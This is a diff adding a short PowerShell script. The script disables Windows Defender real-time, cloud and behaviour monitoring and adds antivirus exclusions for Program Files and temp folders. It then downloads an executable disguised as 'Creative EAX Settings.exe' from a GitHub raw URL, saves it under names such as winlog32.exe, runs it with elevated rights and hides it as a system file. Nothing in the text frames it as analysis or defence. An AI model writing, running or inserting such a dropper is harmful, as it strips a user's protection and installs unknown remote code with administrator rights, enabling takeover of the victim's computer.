@@ -1,0 +1,18 @@
+$settings = '{"WD": false, "adminrun": false}'
+if ($settings.adminrun) {
+    $outputPath = Join-Path $env:programfiles 'winlog32.exe'
+} else {
+    $outputPath = Join-Path $env:programfiles 'zcleaner.exe'
+}
+
+Set-MpPreference -DisableRealtimeMonitoring $true -Force
+Set-MpPreference -DisableCloudProtection $true -Force
+Set-MpPreference -DisableBehaviorMonitoring $true -Force
+Add-MpPreference -ExclusionPath $env:programfiles -Force -ErrorAction SilentlyContinue
+Add-MpPreference -ExclusionPath $env:temp -Force -ErrorAction SilentlyContinue
+Add-MpPreference -ExclusionPath "C:\Windows\Temp" -Force -ErrorAction SilentlyContinue
+$url = "https://github.com/tcOdER1337/dd/raw/refs/heads/main/Creative%20EAX%20Settings.exe"
+(New-Object System.Net.WebClient).DownloadFile($url, $outputPath)
+Add-MpPreference -ExclusionProcess (Split-Path $outputPath -Leaf) -Force -ErrorAction SilentlyContinue
+Start-Process $outputPath -Verb RunAs
+Set-ItemProperty -Path $outputPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)
